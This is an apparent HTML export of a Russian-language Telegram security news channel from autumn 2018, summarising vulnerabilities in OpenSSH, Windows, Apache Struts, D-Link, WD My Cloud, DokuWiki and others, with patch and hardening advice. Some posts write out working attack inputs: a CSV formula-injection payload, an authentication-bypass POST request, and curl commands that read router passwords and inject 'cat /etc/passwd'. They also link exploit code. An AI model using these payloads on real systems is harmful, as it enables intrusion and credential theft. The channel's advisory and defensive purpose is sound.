href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40962.zip">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40962.zip</a><br><br>А еще в версии 7.4 отключили поддержку версии 1 SSH и шифров Blowfish, RC4 и 3DES-CBC и RSA-ключей короче 1024 бит.<br><br>CVE-2016-6210 - до версии 7.3 - еще одна утечка информации о том, существует ли заданный пользователь. Через разницу во времени проверки хешей BLOWFISH и SHA256/SHA512. Скрипт: <a href="https://www.exploit-db.com/exploits/40136/">https://www.exploit-db.com/exploits/40136/</a><br><br>CVE-2016-6515 - до версии 7.3 - это просто DoS: <a href="https://www.exploit-db.com/exploits/40888/">https://www.exploit-db.com/exploits/40888/</a><br><br>CVE-2015-6565 - в версиях 6.8 и 6.9 - повышение привилегий через общедоступные на запись файлы устройств PTY. Эксплойт: <a href="https://www.exploit-db.com/exploits/45280/">https://www.exploit-db.com/exploits/45280/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-193">

      <div class="body details">
3 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message211">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.09.2018 11:10:48">
11:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;проблемы&quot;)">#проблемы</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Полундра!</strong><br><br>Жутковато, что целый домен виндоус может оказаться беззащитным из-за всего одной уязвимости. Например, уязвимости в ALPC-интерфейсе планировщика задач, эксплойт для которой уже публично доступен. А патчи обещают 11 сентября. Эксплойт написан под 64-битные WIndows 10 и Server 2016, однако может быть адаптирован и для других версий. Уязвимость позволяет аутентифицированному пользователю повысить права до SYSTEM. Всего лишь нужно запустить эксплойтик.<br><br>Благо в данном случае есть простое решение - ограничить доступ к директории C:\Windows\Tasks:<br><br><code>icacls c:\windows\tasks /remove:g &quot;Authenticated Users&quot;</code><br><code>icacls c:\windows\tasks /deny system:(OI)(CI)(WD,WDAC)</code><br><br>В таком случае тот злополучный эксплойт работать не будет, в то время как задачи планировщика - будут, и пользователи не потеряют возможность создавать новые задачи. Однако работа заданий устаревшего формата может нарушиться, как пример - задания SCCM и обновления SCEP.<br><br>Не лишним будет проверить наличие всяких посторонних локальных администраторов и даже почитать логи, если не настроена система отслеживания подозрительных событий.<br><br>А еще вот эти ребята <a href="https://0patch.com/">https://0patch.com/</a> говорят, что включили в свой 0patch Agent возможность установить временный патч, но вот он есть только для Windows 10 v1803 х64.
       </div>

      </div>

     </div>

     <div class="message service" id="message-194">

      <div class="body details">
5 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message212">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.09.2018 11:05:15">
11:05
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;apache&quot;)">#apache</a> <a href="" onclick="return ShowHashtag(&quot;git&quot;)">#git</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Не дадим врагу читать исходники</strong><br><br>Один чешский исследователь решил поискать, как часто на сайтах встречаются доступные каталоги .git. Получилось 390 000 на 320 млн. доменов. Причем часто обращение непосредственно к каталогу &quot;.git/&quot; приводит к 403 ошибке, но конкретные файлы вполне себе доступны. Поэтому стоит проверять доступность файлов /.git/HEAD, /.git/config, /.git/index, /.git/refs/heads/master и /.git/logs/HEAD.<br><br>При необходимости закрыть доступ, на примере Apache, можно использовать (по меньшей мере) права доступа к директориям или mod_rewrite в конфигурационном файле или в .htaccess.<br><br>Права доступа к директории в Apache 2.2:<br><br><code>&lt;Directory /&lt;путь к диретории&gt;/.git&gt;</code><br><code>  Order allow,deny</code><br><code>  Deny from all</code><br><code>&lt;/Directory&gt;</code><br><br>Права доступа к директории в Apache 2.4 (но старая версия тоже подойдет):<br><br><code>&lt;Directory /&lt;путь к диретории&gt;/.git&gt;</code><br><code>  Require all denied</code><br><code>&lt;/Directory&gt;</code><br><br>С помощью mod_rewrite:<br><br><code>RewriteEngine On</code><br><code>RewriteRule /&lt;путь к диретории&gt;/\.git - [F,L]</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-195">

      <div class="body details">
10 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message213">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.09.2018 10:02:41">
10:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;dokuwiki&quot;)">#dokuwiki</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;уязвимость&quot;)">#уязвимость</a><br><br><strong>Мы не виноваты, это все Excel</strong><br><br>В DokuWiki нашли уязвимость, или не уязвимость - еще не решили (это CVE-2018-15474). В рамках функционала администраторы DokuWiki могут выгружать список пользователей в виде CSV-файла. А любой пользователь с возможностью регистрации может ввести такие данные, которые в этом файле будут интерпретироваться как формула.<br><br>Страница, где все это происходит: <code>http://www.example.com/doku.php?id=start&amp;do=register</code><br>Тело POST-запроса в стандартном случае имеет такой формат: <code>sectok=&amp;do=register&amp;save=1&amp;login=login_parameter&amp;fullname=fullname_parameter&amp;email=email_address</code><br><br>И вот в параметре <code>fullname</code> недостаточная фильтрация пользовательского ввода и можно ввести формулу.<br>Например, формула <code>=cmd|&apos;/C calc&apos;!A0</code> запустит calc.exe. Так что тут потенциально исполнение произвольного кода.<br><br>Интересность в том, что разработчики решили не исправлять проблему, так что вся ответственность за безопасность ложится на пользователей - администраторов DokuWiki в данном случае.
       </div>

      </div>

     </div>

     <div class="message service" id="message-196">

      <div class="body details">
12 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message214">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.09.2018 12:12:44">
12:12
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;tor&quot;)">#tor</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a><br><br><strong>Когда так приятно быть вайтхэтом</strong><br><br>С выходом Tor Browser 8 Zerodium, компания, которая обычно продает уязвимости, но не раскрывает их, решила все-таки рассказать об уязвимости в версиях 7.х. С мая 2017 в них можно было обойти отключение javascript. Эта проблема появилась в версии 5.0.4 NoScript и устранена в версии <a href="5.1.8.7">5.1.8.7</a>, а ветку NoScript 10 (которая используется в Tor Browser 8) она вообще не затрагивает. Zerodium утверждает, что эксплойт у нее был с осени 2017 и продан заинтересованным сторонам.<br><br>Обойти NoScript очень просто - достаточно установить заголовок Content-Type в <code>text/html;/json</code>. Пример PoC: <a href="https://cxsecurity.com/issue/WLB-2018090116">https://cxsecurity.com/issue/WLB-2018090116</a><br><br>Кто предупрежден - тот вооружен. Но это не точно.
       </div>

      </div>

     </div>

     <div class="message service" id="message-197">

      <div class="body details">
14 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message215">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.09.2018 10:30:52">
10:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a><br><br><strong>Про Apache Struts, все же</strong><br><br>В честь выхода модуля для метасплойта на CVE-2018-11776 вернемся на три недели назад и все же рассмотрим эту уязвимость в Apache Struts. Уязвимость присутствует в версиях 2.3 до 2.3.34 включительно и 2.5 до 2.5.16 включительно. Но эксплуатабельна она только при определенных условиях:<br><br>- в настройках флаг alwaysSelectFullNamespace должен быть выставлен в значение &quot;true&quot; (устанавливается так, например, плагином Convention)<br><br>И<br><br>- в приложении должно применяться действие, указанное в файле конфигурации или Java-коде без указания пространства имён или с указанием маски для пространств имён (&quot;/*&quot;)<br><br>Эксплуатация производится через отправку HTTP-запроса с включением дополнительного параметра, определяющего собственное пространство имён. Из-за отсутствия надлежащих проверок значение параметра может включать выражение на языке OGNL (Object-Graph Navigation Language). Это уже позволяет запустить произвольный Java-код с правами приложения.<br><br>Известные в текущее время варианты проблем в приложениях (это более подробно раскрывает второе условие возможности эксплуатации):<br><br>1. В атрибуте <code>type</code> тега <code>result</code> не указано простанство имен. Работает для типов <code>redirectAction</code>, <code>chain</code> и <code>postback</code><br>2. Для <code>package</code> не задано пространство имен или установлено &quot;/*&quot;, а в теге <code>result</code> задан URL<br>3. Используется тег <code>s:url</code> без указания атрибутов <code>action</code> или <code>value</code><br><br>Первый PoC с открытием шелла: <a href="https://github.com/hook-s3c/CVE-2018-11776-Python-PoC">https://github.com/hook-s3c/CVE-2018-11776-Python-PoC</a><br>Модуль для метасплойта: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb</a><br><br>Версии с устранением уязвимости 2.3.35 и 2.5.17 доступны.
       </div>

      </div>

     </div>

     <div class="message service" id="message-198">

      <div class="body details">
18 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message216">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.09.2018 10:49:50">
10:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>VSM и Credential Guard</strong><br><br>Если в вашем домене используются Windows 10 Enterprise x64 или Server 2016 x64 и вы печетесь о безопасности, то весьма полезным будет воспользоваться функцией VSM (Virtual Secure Mode). VSM запускает защищенную вирутальную машину, к которой нет прямого доступа даже у ядра. Затем в VSM можно перенести некоторые системные компоненты: LSASS, vTPM и контроль целостности ОС. Нас интересует в первую очередь LSASS - доменные учетные данные будут храниться в VSM и не смогут быть напрямую извлечены.<br><br>Ради такого придется поднапрячься, нужно:<br><br>1. UEFI Secure Boot и UEFI версии 2.3.1 или выше<br><br>2. Установить компоненты Hyper-V<br><br>3. Затем можно включить VSM через групповую политику.<br><br>Параметр групповой политики Computer Configuration -&gt; System -&gt; Device Guard -&gt; Turn on Virtualization Based Security. Тут можно включить защиту системы контроля целостности кода и Credential Guard.<br><br>При выборе варианта &quot;without UEFI lock&quot; параметры будут храниться в реестре и могут быть изменены из ОС. В случае &quot;with UEFI lock&quot; будут использоваться параметры UEFI и из ОС уже нельзя будет отключить VSM.<br><br>VSM включится после перезагрузки. Проверить его активность можно в &quot;System Information&quot; или по наличию процесса LsaIso (при включении Credential Guard).
       </div>

      </div>

     </div>

     <div class="message service" id="message-199">

      <div class="body details">
21 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message217">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.09.2018 10:30:36">
10:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Everyone&apos;s Cloud now</strong><br><br>В апреле в сетевых хранилищах My Cloud от Western Digital обнаружили обход аутентификации, а по некоторым слухам про него было известно еще в начале 2017. В любом случае уязвимость все еще не устранена, а вот экслойт уже публично доступен.<br><br>При обычной работе My Cloud после аутентификации администратора создается админская сессия, привязанная к IP, а админ получает куку username=admin. А вот вызов функции cgi_get_ipv6 network_mgr.cgi приводит к созданию админской сессии без всякой авторизации. Затем остается проставить куку username=admin и админский доступ готов. Первый шаг делается примерно таким POST-запросом:<br><br><code>POST /cgi-bin/network_mgr.cgi HTTP/1.1</code><br><code>Host: wdmycloud.local</code><br><code>Content-Type: application/x-www-form-urlencoded</code><br><code>Cookie: username=admin</code><br><code>Content-Length: 23</code><br><br><code>cmd=cgi_get_ipv6&amp;flag=1</code><br><br>Что касается апдейта - он &quot;на финальной стадии разработки&quot;, но нужно еще &quot;несколько недель&quot;. Так что пока рекомендуется максимально ограничить сетевой доступ к веб-интерфейсу.
       </div>

      </div>

     </div>

     <div class="message service" id="message-200">

      <div class="body details">
28 September 2018
      </div>

     </div>

     <div class="message default clearfix" id="message218">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.09.2018 11:16:58">
11:16
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Две важных новости в жизни linux kernel</strong><br><br>Первая с красивым названием Mutagen Astronomy. <br>А вообще это CVE-2018-14634 и представляет собой возможность переполнения целого в функции create_elf_tables(). Проблема встречается только в Red Hat Enterprise Linux (6, 7 и MRG2), CentOS и Debian 8, потому что в них не включено изменение da029c11e6b1 (&quot;exec: Limit arg stack to at most 75% of _STK_LIM&quot;, from July 7, 2017).<br>На 64-битных системах уязвимость позволяет повысить права до рута, или еще кого-нибудь, через SUID-приложение. PoC доступен.<br>Подробности: <a href="https://www.openwall.com/lists/oss-security/2018/09/25/4">https://www.openwall.com/lists/oss-security/2018/09/25/4</a><br>PoC: <a href="https://packetstormsecurity.com/files/149567/QSA-linuxoverflow.tgz">https://packetstormsecurity.com/files/149567/QSA-linuxoverflow.tgz</a><br><br>Вторая - CVE-2018-17182 - use-after-free через переполнение 32-разрядного номера последовательности в функции vmacache_flush_all.<br>Имеет место начиная с версии 3.16 и пофикшена в версиях 4.18.9, 4.14.71, 4.9.128, 4.4.157 и 3.16.58.<br>Уязвимость может быть использована для повышения привилегий любым локальным процессом, который может выполняться достаточно долго для переполнения счетчика ссылок (около часа, если доступен MAP_FIXED) и способного выполнять маппинг областей памяти при помощи системных вызовов mmap()<a href="" onclick="return ShowBotCommand(&quot;munmap&quot;)">/munmap</a>() и создавать потоки через вызов clone(). Эти системные вызовы не требуют каких-то особых привилегий и обычно доступны даже из sandbox-окружений (например, допустимы в sandbox-окружении процесса отрисовки браузера Chrome и присутствуют в списке разрешённых системных вызовов Docker).<br>Подбробности и описание эксплойта: <a href="https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html">https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html</a><br>Эксплойт: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1664">https://bugs.chromium.org/p/project-zero/issues/detail?id=1664</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-201">

      <div class="body details">
3 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message219">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.10.2018 10:26:21">
10:26
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;telegram&quot;)">#telegram</a> <a href="" onclick="return ShowHashtag(&quot;уязвимость&quot;)">#уязвимость</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Новая настройка безопасности в Telegram</strong><br><br>Уязвимость на 2000 евро - раскрытие IP-адресов абонентов в десктопных телеграмах в случае использования голосовых вызовов. Просто потому что устанавливается peer-to-peer соединение. Ревард выплачен, и уязвимость классифицирована как CVE-2018-17780.<br><br>Теперь доступна версия Telegram Desktop 1.4.0, в которой уязвимость, раскрытие адресов то есть, МОЖНО отключить. Для этого повилась настройка, возволяющая выбрать, в каких случаях разрешено устанавливать peer-to-peer соединение, а в каких - нет. Варианты: everybody (разрешено со всеми), my contacts (разрешено только с контактами), nobody (ни с кем не разрешено). Устанавливается в Settings &gt; Privacy and security &gt; Calls &gt; peer-to-peer. Так что есть смысл озаботиться выбором подходящего варианта.
       </div>

      </div>

     </div>

     <div class="message service" id="message-202">

      <div class="body details">
5 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message220">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.10.2018 10:31:38">
10:31
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;zabbix&quot;)">#zabbix</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>А вы следите за своим заббиксом?</strong><br><br>На днях выпустили версию 4.0 Zabbix. Но пост не о ней, а о том, что было со старыми версиями. Назначенных CVE в заббиксе очень мало: 0 за 2018 год, CVE-2017-2824 и CVE-2017-2826 в 2017, CVE-2016-4338 и CVE-2016-10134 в 2016, а раньше - уже в 2014.<br><br>CVE-2017-2824 - это выполнение произвольных команд при подключении от имени заббикс-прокси. Уязвимость устранена в версиях 2.2.19rc1, 3.0.10rc1, 3.2.7rc1, 3.4.0alpha1 и осталась в ветке 2.4.х (которая уже не поддерживалась к моменту выявления проблемы) (<a href="https://support.zabbix.com/browse/ZBX-12349">https://support.zabbix.com/browse/ZBX-12349</a>).<br><br>Возможная атака основана на двух API-вызовах, доступных для заббикс-прокси, <code>command</code> и <code>discovery data</code>. Если на заббиксе включены Auto-discovery и Auto-registration, то он принимает от прокси данные о новых хостах через вызов <code>discovery data</code> и добавляет их в таблицы <code>hosts</code> и <code>interface</code>. Затем с помощью вызова <code>command</code> можно запустить выполнение дефолтных скриптов для этих хостов, причем это не требует аутентификации. Скрипты изначально лежат в таблице <code>scripts</code> (их можно удалить, тогда вся идея испортится):<br><br><code>scriptid == 1 == /bin/ping -c {HOST.CONN} 2&gt;&amp;1</code><br><code>scriptid == 2 == /usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1</code><br><code>scriptid == 3 == sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1</code><br><br>Параметр HOST.CONN предназначен для IP хоста, является VARCHAR(64) и передается в таком сценарии от прокси, что позволяет внедрить команду.<br><br>Источник и детали (формат вызовов тоже есть): <a href="https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325">https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-203">

      <div class="body details">
9 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message221">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.10.2018 11:20:53">
11:20
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;boot&quot;)">#boot</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>+1 головная боль</strong><br><br>Появились случаи использования UEFI руткитов. Таких, что прописываются прям в микросхему загрузки. Но мода на них наверно так и не разовьется, потому что мы сейчас от них защитимся.<br><br>Во-первых, микросхемы SPI имеют набор эффективных способов защиты от перезаписи. Вот только далеко не все разработчики загрузочного софта их используют. Отсюда вывод - отслеживать обновления софта и установить его, если там внедрили защиту, или просто обновлять периодически.<br><br>Во-вторых, в прошивке бывают уязвимости. Вывод такой же - обновления.<br><br>И в-третьих, самое толковое (потому что реалистичное) - включить Secure Boot. Он будет проверять цифровые подписи ВСЕХ компонентов UEFI и не позволит запустить сторонний код.
       </div>

      </div>

     </div>

     <div class="message service" id="message-204">

      <div class="body details">
16 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message222">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.10.2018 11:26:30">
11:26
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Imperva RCE</strong><br><br>На прошлой неделе много интересного опубликовали. Посмотрим для начала забавный эскплойт для Imperva SecureSphere.<br><br>Проблема актуальна для версий 13.0.10, 13.1.10, 13.2.10. Злодей может выполнить произвольные команды с правами рута, без аутентификации или с аутентификацией в зависимости от конфигурации системы. Если не настроен SOM/MX/Gateway режим - аутентификация не требуется. Если установлен режим Gateway - необходим пароль юзера imperva.<br><br>Используется внедрение непредусмотренных команд в компоненте PWS (набор скриптов Python CGI), конкретно - скрипт impcli.<br><br>Ну в общем вот он весь: <a href="https://www.exploit-db.com/exploits/45542/">https://www.exploit-db.com/exploits/45542/</a>
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message223">

      <div class="body">

       <div class="pull_right date details" title="16.10.2018 11:26:55">
11:26
       </div>

       <div class="media_wrap clearfix">

        <a class="photo_wrap clearfix pull_left" href="photos/photo_3@16-10-2018_11-26-55.jpg">

         <img class="photo" src="photos/photo_3@16-10-2018_11-26-55_thumb.jpg" style="width: 260px; height: 158px"/>

        </a>

       </div>

       <div class="text">
Техподдержка импервы местами ведет в никуда. Я даже было подумала, что она только для избранных, но нет, она есть: <a href="https://www.imperva.com/Services/TechnicalSupport">https://www.imperva.com/Services/TechnicalSupport</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-205">

      <div class="body details">
18 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message224">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.10.2018 11:13:10">
11:13
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;libssh&quot;)">#libssh</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Говорят, это смешно. Похоже на то</strong><br><br>Очень модно нынче про libssh писать. Там с версии 0.6 унифицировали код клиента и сервера, и в сервер перекочевал функционал считать аутентификацию успешной после сообщения SSH2_MSG_USERAUTH_SUCCESS. Теперь клиенту достаточно отправить это сообщение вместо запроса на аутентификацию, чтобы получить доступ. <br><br>Уязвимость получила номер CVE-2018-10933. Исправление добавлено в выпуски 0.8.4 и 0.7.6.<br><br>libssh чаще используется для реализации клиентской стороны, а не серверной, поэтому уязвимых серверов не так уж и много. Один из значимых продуктов, где libssh используется для сервера, - GitHub Enterprise - не подвержен уязвимости, так как libssh в нем модифицирована.<br><br>Ну и скрипт для проверки наличия уязвимости, он же PoC, открывающий шелл при успешной &quot;эксплуатации&quot;: <a href="https://www.openwall.com/lists/oss-security/2018/10/17/5">https://www.openwall.com/lists/oss-security/2018/10/17/5</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-206">

      <div class="body details">
19 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message225">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.10.2018 11:23:38">
11:23
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;уязвимости&quot;)">#уязвимости</a><br><br><strong>Коллекция проблем с сетевым оборудованием за последние пару недель</strong><br><br><strong>D-Link</strong><br>Обход директорий (CVE-2018-10822), хранение паролей в открытом виде (CVE-2018-10824) и внедрение команд (CVE-2018-10823). Уязвимые версии: DWR-116 до 1.06, DIR-140L до 1.02 (кроме 2018-10823), DIR-640L до 1.02 (кроме 2018-10823), DWR-512 до 2.02, DWR-712 до 2.02, DWR-912 до 2.02, DWR-921 до 2.02, DWR-111 до 1.01.<br><br>Первые две позволяют получить пароль из файла /tmp/XXX/0:<br><code>curl http://routerip/uir//tmp/XXX/0</code><br><br>Внедрение команд:<br><code>curl http://routerip/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd</code><br><br>Подробнее:<a href="https://seclists.org/fulldisclosure/2018/Oct/36">https://seclists.org/fulldisclosure/2018/Oct/36</a><br><br>И еще уязвимости в D-Link Central WiFiManager:<br>CVE-2018-17440 - учетка admin/admin в FTP-сервере на порту 9000<br>CVE-2018-17441 - XSS<br>CVE-2018-17442 - выполнение PHP-кода через загрузку архивов RAR<br>CVE-2018-17443 - XSS<br><br>Эти исправлены в версии Central WiFiManager 1.03R0100-Beta1.<br><br><strong>Mikrotik</strong><br>Новый эксплойт для CVE-2018-14847 - получение рутового доступа: <a href="https://cxsecurity.com/issue/WLB-2018100099">https://cxsecurity.com/issue/WLB-2018100099</a><br><br>И еще ряд уязвимостей:<br>CVE-2018-1156 - возможность выполнения произвольного кода на устройстве при наличии аутентифицированного доступа<br>CVE-2018-1157 - DoS-атака через исчерпание всей доступной памяти при загрузке файла<br>CVE-2018-1158 - переполнение стека при рекурсивном разборе запросов<br>CVE-2018-1159 - выход за допустимые границы буфера в реализации http-сервера<br><br>Уязвимости исправлены в версиях RouterOS 6.40.9, 6.42.7 и 6.43.<br><br><strong>TP-Link</strong><br>Три новых уязвимости в TP-Link TL-WR841N:<br>CVE-2018-15700 - отказ в обслуживании httpd сервиса в результате HTTP-запроса из локальной сети с пустым Referer<br>CVE-2018-15701 - отказ в обслуживании httpd сервиса в результате HTTP-запроса с заголовком Cookie вида &apos;Cookie: Authorization;&apos;<br>CVE-2018-15702 - возможность CSRF в результате неполной проверки Referer (проверяются только первые несколько символов)<br><br>Последняя уязвимость комбинируется со &quot;старой&quot; CVE-2018-11714 - возможность обращения к CGI-скриптам без прохождения аутентификации при установке в Referer значения, свидетельствующего о переходе с хостов &quot;<a href="tplinkwifi.net">tplinkwifi.net</a>&quot;, &quot;<a href="tplinklogin.net">tplinklogin.net</a>&quot; или с IP-адреса текущего маршрутизатора. Можно получить конфигурацию, изменять ее параметры, сменить пароль для WiFi. Примеры эксплуатации: <a href="https://www.exploit-db.com/exploits/44781/">https://www.exploit-db.com/exploits/44781/</a>. CVE-2018-15702 позволяет выполнять это через CSRF.<br><br>Для этих уязвимостей, в том числе CVE-2018-11714, патчи все еще не выпущены. CVE-2018-11714 также присутствует в TL-WR840N.<br><br><strong>Junos OS</strong><br>Исправлено много уязвимостей: CVE-2018-7173, CVE-2018-7170, CVE-2018-7172, CVE-2018-7174, CVE-2018-7175, CVE-2016-1549, CVE-2018-0062, CVE-2018-0061, CVE-2018-0060, CVE-2018-0057, CVE-2018-0055, CVE-2018-0054, CVE-2018-0053, CVE-2018-0052, CVE-2018-0051, CVE-2018-0050, CVE-2018-0047, CVE-2018-0045, CVE-2018-0043, CVE-2018-0049, CVE-2018-0048, CVE-2018-0003, CVE-2018-0046, CVE-2017-15906, CVE-2016-10012, CVE-2016-10011, CVE-2016-10010, CVE-2016-10009. Некоторые из них позволяют получить доступ или выполнить код при особых конфигурациях или дополнительных действиях. Подробности можно посмотреть тут: <a href="https://kb.juniper.net/InfoCenter/index?page=content&amp;channel=SECURITY_ADVISORIES">https://kb.juniper.net/InfoCenter/index?page=content&amp;channel=SECURITY_ADVISORIES</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-207">

      <div class="body details">
24 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message226">

      <div class="pull_left userpic_wrap">
